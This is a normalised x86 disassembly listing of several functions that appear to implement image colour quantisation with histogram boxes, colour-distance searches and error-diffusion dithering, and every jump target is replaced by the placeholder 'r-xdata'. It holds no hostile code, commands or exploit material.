mov [ esp + 0x1c ] eax
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ ecx + edx * 4 ]
mov [ esp + 0x44 ] eax
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax esi
cmp eax [ esp + 0x18 ]
jl r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ esp + 0x38 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
dec ebx
cmp ebx [ esp + 0x10 ]
jge r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc edx
add [ esp + 0x30 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0xc ] edx
mov eax [ esp ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x1c ]
mov [ edx + 0x1c ] ecx
add esp 0x48
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x44 ]
mov ecx eax
mov [ esp + 0x40 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ esp + 0x3c ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
inc eax
cmp esi eax
jge r-xdata
mov ecx [ esp + 0x38 ]
mov ebx [ esp + 0x10 ]
shl ebx 0x6
mov ecx [ ecx ]
add ecx ebx
mov ebx eax
add ebx ebx
add ecx ebx
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x34 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x10 ] ebx
mov eax [ esp ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
inc edx
add [ esp + 0x44 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
dec eax
cmp eax [ esp + 0x18 ]
jge r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
shl ebx 0x6
mov ecx [ ecx ]
add ecx ebx
mov ebx eax
add ebx ebx
add ecx ebx
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x38 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x14 ] ebx
mov eax [ esp ]
mov [ eax + 0xc ] ebx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc edx
add [ esp + 0x3c ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ebx
add ecx 0x40
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x10 ] eax
jmp r-xdata
inc eax
add ecx 0x2
cmp esi eax
jge r-xdata
inc [ esp + 0x1c ]
inc ebx
add ecx 0x40
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov esi eax
mov edx [ esp ]
mov [ edx + 0x14 ] eax
jmp r-xdata
sub_45f0d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp esi [ ebp + 0x8 ]
jge r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
add eax eax
cmp eax [ ebp + 0x8 ]
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_45ecd8
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_45ecac
jmp r-xdata
mov ebx esi
shl ebx 0x5
add ebx [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov ecx [ eax + 0xc ]
mov [ ebx + 0xc ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax ]
mov [ ebx ] ecx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x4 ]
sub edx [ eax ]
shl edx 0x3
mov [ ebp - 0xc ] edx
mov ecx [ eax + 0xc ]
sub ecx [ eax + 0x8 ]
shl ecx 0x2
lea edx [ ecx + ecx * 2 ]
mov ecx [ eax + 0x14 ]
sub ecx [ eax + 0x10 ]
shl ecx 0x3
add ecx ecx
mov [ ebp - 0x10 ] ecx
mov ecx 0x1
cmp edx [ ebp - 0x10 ]
jge r-xdata
test eax eax
je r-xdata
cmp edx [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov ecx 0x2
sub ecx 0x1
jb r-xdata
xor ecx ecx
mov edx [ eax + 0x4 ]
add edx [ eax ]
sar edx 0x1
jns r-xdata
je r-xdata
mov [ eax + 0x4 ] edx
inc edx
mov [ ebx ] edx
jmp r-xdata
adc edx 0x0
mov edx [ eax + 0xc ]
add edx [ eax + 0x8 ]
sar edx 0x1
jns r-xdata
dec ecx
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45ed00
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45ed00
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
mov [ eax + 0xc ] edx
inc edx
mov [ ebx + 0x8 ] edx
jmp r-xdata
adc edx 0x0
mov edx [ eax + 0x14 ]
add edx [ eax + 0x10 ]
sar edx 0x1
jns r-xdata
jmp r-xdata
mov [ eax + 0x14 ] edx
inc edx
mov [ ebx + 0x10 ] edx
adc edx 0x0
sub_45f1ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov eax [ eax + 0x1be ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x18 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
xor ecx ecx
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov [ esp + 0x24 ] ecx
mov ecx [ edx ]
mov ebx [ edx + 0x4 ]
mov [ esp + 0x8 ] ebx
mov ebx [ edx + 0x8 ]
lea eax [ eax + ecx * 4 ]
mov [ esp + 0xc ] ebx
mov ebx [ edx + 0xc ]
mov [ esp + 0x10 ] ebx
mov ebx [ edx + 0x10 ]
mov [ esp + 0x14 ] ebx
mov esi [ edx + 0x14 ]
mov [ esp + 0x2c ] eax
cmp ecx [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0x18 ]
sar ecx 0x1
mov eax ecx
add eax [ esp + 0x1c ]
cdq
idiv [ esp + 0x18 ]
mov edx [ esp ]
mov ebx [ edx + 0x84 ]
mov edx [ ebx ]
mov esi [ esp + 0x4 ]
mov [ edx + esi ] al
mov eax ecx
add eax [ esp + 0x20 ]
cdq
idiv [ esp + 0x18 ]
mov edx [ ebx + 0x4 ]
mov esi [ esp + 0x4 ]
mov [ edx + esi ] al
mov eax ecx
add eax [ esp + 0x24 ]
cdq
idiv [ esp + 0x18 ]
mov ecx [ ebx + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ ecx + edx ] al
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
mov eax [ esp + 0x2c ]
mov edx eax
mov [ esp + 0x28 ] edx
cmp ebx [ esp + 0x10 ]
jg r-xdata
inc ecx
add [ esp + 0x2c ] 0x4
cmp ecx [ esp + 0x8 ]
jle r-xdata
mov eax [ esp + 0x28 ]
mov edi [ eax ]
mov eax ebx
shl eax 0x6
add edi eax
mov edx [ esp + 0x14 ]
add edx edx
add edi edx
mov edx [ esp + 0x14 ]
cmp esi edx
jl r-xdata
inc ebx
cmp ebx [ esp + 0x10 ]
jle r-xdata
mov ax [ edi ]
add edi 0x2
movzx eax ax
test eax eax
je r-xdata
inc edx
cmp esi edx
jge r-xdata
add [ esp + 0x18 ] eax
mov ebp ecx
shl ebp 0x3
add ebp 0x4
imul ebp eax
add [ esp + 0x1c ] ebp
mov ebp ebx
shl ebp 0x2
add ebp 0x2
imul ebp eax
add [ esp + 0x20 ] ebp
mov ebp edx
shl ebp 0x3
add ebp 0x4
imul ebp eax
add [ esp + 0x24 ] ebp
sub_45f330
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov ebx edx
push ebp
mov ecx ebx
mov esi [ eax + 0x4 ]
mov edx 0x1
shl ecx 0x5
call [ esi ]
mov esi eax
xor eax eax
xor edx edx
xor ecx ecx
mov [ esi ] eax
mov eax edi
mov [ esi + 0x4 ] 0x1f
mov [ esi + 0x8 ] edx
mov edx esi
mov [ esi + 0xc ] 0x3f
mov [ esi + 0x10 ] ecx
mov ebp 0x1
mov [ esi + 0x14 ] 0x1f
call sub_45ed00
push ebx
mov ecx ebp
mov edx esi
mov eax edi
call sub_45f0d0
mov ebp eax
xor ebx ebx
cmp ebp ebx
jle r-xdata
mov [ edi + 0x80 ] ebp
mov edx 0x1
mov eax [ edi ]
mov [ eax + 0x14 ] 0x5f
mov [ eax + 0x18 ] ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov ecx ebx
shl edx 0x5
mov eax edi
add edx esi
call sub_45f1ec
inc ebx
cmp ebp ebx
jg r-xdata
sub_45f3c8
push ebp
mov ebp esp
add esp 0xfffffbc4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x80 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x18
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
sar edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1c
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x14 ]
sar edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp + 0xc ]
add ecx 0x18
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x18 ]
sar edx 0x1
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x43c ]
mov [ ebp - 0x2c ] 0x7fffffff
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x3c ] edx
mov ecx [ eax + 0x84 ]
mov edx [ ecx + 0x8 ]
mov ecx edx
mov [ ebp - 0x38 ] ecx
mov edx [ eax + 0x84 ]
mov ecx [ edx + 0x4 ]
mov edx ecx
mov [ ebp - 0x34 ] edx
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
mov eax ecx
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
xor eax eax
xor ecx ecx
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x43c ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
cmp ebx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x30 ]
xor ebx ebx
mov bl [ ecx ]
cmp ebx [ ebp - 0x4 ]
jge r-xdata
mov eax ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ eax ]
cmp ebx [ ebp - 0x2c ]
jg r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov edx eax
imul edx eax
mov eax ebx
sub eax [ ebp - 0x10 ]
mov ecx eax
imul ecx eax
jmp r-xdata
inc [ ebp - 0x28 ]
add eax 0x4
mov ebx [ ebp - 0x28 ]
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov bl [ ebp - 0x28 ]
inc ecx
mov [ edx ] bl
inc edx
xor edx edx
cmp ebx [ ebp - 0x1c ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
mov edx eax
imul edx eax
mov eax ebx
sub eax [ ebp - 0x4 ]
mov ecx eax
imul ecx eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
xor ebx ebx
mov bl [ eax ]
cmp ebx [ ebp - 0x8 ]
jge r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov ecx eax
imul ecx eax
mov eax ebx
sub eax [ ebp - 0x10 ]
mov ecx eax
imul ecx eax
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jle r-xdata
mov eax ebx
sub eax [ ebp - 0x8 ]
sub ebx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
mov esi eax
imul esi eax
lea eax [ ebx + ebx * 2 ]
add edx esi
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x20 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x14 ]
sub ebx [ ebp - 0x8 ]
lea eax [ eax + eax * 2 ]
mov esi eax
imul esi eax
lea eax [ ebx + ebx * 2 ]
add edx esi
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
mov eax [ ebp - 0x38 ]
xor ebx ebx
mov bl [ eax ]
cmp ebx [ ebp + 0xc ]
jge r-xdata
sub ebx [ ebp - 0x8 ]
lea eax [ ebx + ebx * 2 ]
mov ebx eax
imul ebx eax
add ecx ebx
sub ebx [ ebp - 0x14 ]
lea eax [ ebx + ebx * 2 ]
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jle r-xdata
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov esi eax
imul esi eax
add edx esi
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x24 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov esi eax
imul esi eax
add edx esi
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov [ eax ] edx
cmp ecx [ ebp - 0x2c ]
jge r-xdata
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
inc [ ebp - 0x28 ]
add [ ebp - 0x3c ] 0x4
inc [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jl r-xdata
mov [ ebp - 0x2c ] ecx
sub_45f608
push ebp
mov ebp esp
add esp 0xfffffdc4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x7f
lea ecx [ ebp - 0x23c ]
mov [ ecx ] 0x7fffffff
add ecx 0x4
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0xc ]
mov eax edx
mov [ ebp - 0x3c ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x3c ]
xor eax eax
mov al [ ecx ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov edx [ edx + 0x84 ]
mov eax [ edx ]
movzx eax [ eax + ecx ]
push eax
mov eax [ ebp - 0x8 ]
pop ecx
sub eax ecx
mov ecx eax
imul ecx eax
mov [ ebp - 0x24 ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ ebp - 0x1c ]
shl eax 0x4
movzx ecx [ ecx + ebx ]
mov ebx [ ebp - 0xc ]
add eax 0x40
sub ebx ecx
lea ecx [ ebx + ebx * 2 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x34 ]
imul ecx [ ebp - 0x34 ]
add [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x1c ]
mov edx [ edx + 0x8 ]
movzx edx [ edx + ecx ]
mov ecx [ ebp + 0x14 ]
sub ecx edx
add ecx ecx
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
add [ ebp - 0x24 ] edx
mov edx [ ebp - 0x34 ]
shl edx 0x3
lea edx [ edx + edx * 2 ]
add edx 0x90
mov [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x38 ]
shl ecx 0x5
add ecx 0x100
mov [ ebp - 0x38 ] ecx
lea ecx [ ebp - 0x23c ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x10 ] 0x3
add esi edx
add edx 0x200
add ecx 0x4
inc [ ebp - 0x20 ]
dec eax
test eax eax
jge r-xdata
mov [ ecx ] esi
mov bl [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov [ edi ] bl
cmp esi [ ecx ]
jge r-xdata
mov eax [ ebp - 0x30 ]
add [ ebp - 0x28 ] eax
add [ ebp - 0x30 ] 0x120
dec [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
mov esi [ ebp - 0x28 ]
mov edx [ ebp - 0x38 ]
mov eax 0x3
mov edx [ ebp - 0x2c ]
add [ ebp - 0x24 ] edx
add [ ebp - 0x2c ] 0x80
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x14 ] 0x7
inc [ ebp - 0x18 ]
inc [ ebp - 0x3c ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x10 ]
jl r-xdata
sub_45f780
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebx + 0x1be ]
lea ecx [ ebp - 0x114 ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0xc ] edx
sar [ ebp - 0x4 ] 0x2
sar [ ebp - 0x8 ] 0x3
sar [ ebp + 0x8 ] 0x2
mov esi [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
shl edi 0x5
shl esi 0x5
add edi 0x2
shl eax 0x5
add esi 0x4
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax ebx
mov edx [ ebp - 0x10 ]
push edx
push ecx
mov ecx edi
mov edx esi
call sub_45f3c8
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x194 ]
push edx
push eax
lea eax [ ebp - 0x114 ]
mov edx esi
push eax
push ecx
mov ecx edi
mov eax ebx
call sub_45f608
shl [ ebp - 0x4 ] 0x2
shl [ ebp - 0x8 ] 0x3
shl [ ebp + 0x8 ] 0x2
lea ecx [ ebp - 0x194 ]
xor eax eax
mov [ ebp - 0x14 ] eax
movzx esi [ ecx ]
inc esi
mov [ eax ] si
inc ecx
add eax 0x2
inc edx
cmp edx 0x4
jl r-xdata
inc ebx
cmp ebx 0x8
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + eax * 4 ]
mov edx [ ebp - 0x8 ]
add edx ebx
shl edx 0x6
add eax edx
mov edx [ ebp + 0x8 ]
add edx edx
add eax edx
xor edx edx
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x4
jl r-xdata
xor ebx ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45f860
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1be ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
mov ebx [ edx ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x24 ] 0x4
add [ ebp - 0x20 ] 0x4
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
xor eax eax
xor edx edx
mov al [ ebx ]
inc ebx
xor ecx ecx
sar eax 0x3
mov dl [ ebx ]
inc ebx
sar edx 0x2
mov cl [ ebx ]
sar ecx 0x3
inc ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x8 ]
mov esi [ ecx + eax * 4 ]
mov ecx edx
shl ecx 0x6
add esi ecx
mov ecx [ ebp - 0x10 ]
add ecx ecx
add esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov al [ esi ]
add al 0xff
mov [ edx ] al
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
ja r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx edx
mov edx [ ebp - 0x4 ]
xchg edx eax
call sub_45f780
sub_45f92c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1be ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x6c ]
mov [ ebp - 0x50 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x136 ]
mov [ ebp - 0x54 ] edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x28 ]
mov [ ebp - 0x58 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x84 ]
mov eax [ ecx ]
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x84 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x60 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x84 ]
xor edx edx
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x48 ] edx
mov ecx [ ebp - 0xc ]
mov eax ecx
mov [ ebp - 0x70 ] eax
mov edx [ ebp - 0x8 ]
mov ecx edx
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x48 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x70 ]
mov edx [ eax ]
mov [ ebp - 0x38 ] edx
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x44 ] 0x3
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x10 ]
mov [ edx + 0x24 ] 0x1
mov eax [ ebp - 0x50 ]
dec eax
lea edx [ eax + eax * 2 ]
add [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x50 ]
dec ecx
add [ ebp - 0x38 ] ecx
mov [ ebp - 0x40 ] 0xffffffff
mov [ ebp - 0x44 ] 0xfffffffd
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x10 ]
lea ecx [ ecx + ecx * 2 ]
mov edx [ eax + 0x20 ]
add ecx 0x3
add ecx ecx
add edx ecx
mov [ ebp - 0x30 ] edx
xor edx edx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov ax [ ebp - 0x24 ]
mov [ ecx ] ax
mov edx [ ebp - 0x30 ]
mov cx [ ebp - 0x28 ]
mov [ edx + 0x2 ] cx
mov eax [ ebp - 0x30 ]
mov dx [ ebp - 0x2c ]
mov [ eax + 0x4 ] dx
inc [ ebp - 0x48 ]
add [ ebp - 0x70 ] 0x4
add [ ebp - 0x6c ] 0x4
mov ecx [ ebp - 0x48 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x44 ]
movsx edx [ ecx + eax * 2 ]
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x30 ]
add edi edx
movsx edx [ ecx + eax * 2 + 0x2 ]
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x30 ]
add esi edx
add edi 0x8
movsx edx [ ecx + eax * 2 + 0x4 ]
add ebx edx
mov ecx [ ebp - 0x58 ]
sar edi 0x4
add ebx 0x8
add esi 0x8
mov eax [ ebp - 0x58 ]
sar esi 0x4
mov edx [ ebp - 0x58 ]
sar ebx 0x4
mov edi [ ecx + edi * 4 ]
mov ecx [ ebp - 0x34 ]
mov esi [ eax + esi * 4 ]
mov ebx [ edx + ebx * 4 ]
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ ecx ]
xor ecx ecx
add edi eax
mov eax [ ebp - 0x34 ]
mov cl [ edx + 0x1 ]
xor edx edx
add esi ecx
mov ecx [ ebp - 0x54 ]
mov dl [ eax + 0x2 ]
xor eax eax
add ebx edx
mov edx [ ebp - 0x54 ]
mov al [ ecx + edi ]
xor ecx ecx
mov edi eax
mov eax [ ebp - 0x54 ]
mov cl [ edx + esi ]
xor edx edx
mov dl [ eax + ebx ]
mov eax edi
sar eax 0x3
mov ebx edx
mov edx [ ebp - 0x14 ]
mov esi ecx
mov ecx [ edx + eax * 4 ]
mov edx esi
sar edx 0x2
shl edx 0x6
add ecx edx
mov edx ebx
sar edx 0x3
add edx edx
add ecx edx
mov [ ebp - 0x3c ] ecx
mov ecx [ ebp - 0x3c ]
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
xor edx edx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x50 ]
xor ecx ecx
mov [ ebp - 0x4c ] eax
mov ebx ecx
cmp [ ebp - 0x4c ] 0x0
mov esi ecx
mov edi ecx
jbe r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
movzx eax [ ecx ]
dec eax
mov [ edx ] al
xor edx edx
mov ecx [ ebp - 0x5c ]
mov dl [ ecx + eax ]
mov ecx [ ebp - 0x60 ]
sub edi edx
xor edx edx
mov dl [ ecx + eax ]
mov ecx [ ebp - 0x64 ]
sub esi edx
movzx eax [ ecx + eax ]
sub ebx eax
mov [ ebp - 0x68 ] edi
mov eax edi
mov dx [ ebp - 0x24 ]
add eax eax
add edi eax
mov ecx [ ebp - 0x30 ]
add dx di
add edi eax
mov [ ecx ] dx
mov edx [ ebp - 0x18 ]
add edx edi
add edi eax
mov [ ebp - 0x24 ] edx
mov eax esi
mov ecx [ ebp - 0x68 ]
add eax eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x68 ] esi
mov dx [ ebp - 0x28 ]
add esi eax
add dx si
mov ecx [ ebp - 0x30 ]
add esi eax
mov [ ecx + 0x2 ] dx
mov edx [ ebp - 0x1c ]
add edx esi
add esi eax
mov [ ebp - 0x28 ] edx
mov eax ebx
mov ecx [ ebp - 0x68 ]
add eax eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x68 ] ebx
mov dx [ ebp - 0x2c ]
add ebx eax
add dx bx
mov ecx [ ebp - 0x30 ]
add ebx eax
mov [ ecx + 0x4 ] dx
mov edx [ ebp - 0x20 ]
add edx ebx
add ebx eax
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x44 ]
add [ ebp - 0x34 ] eax
mov eax [ ebp - 0x40 ]
add [ ebp - 0x38 ] eax
mov edx [ ebp - 0x44 ]
add edx edx
add [ ebp - 0x30 ] edx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
ja r-xdata
mov edx ebx
sar edx 0x3
push edx
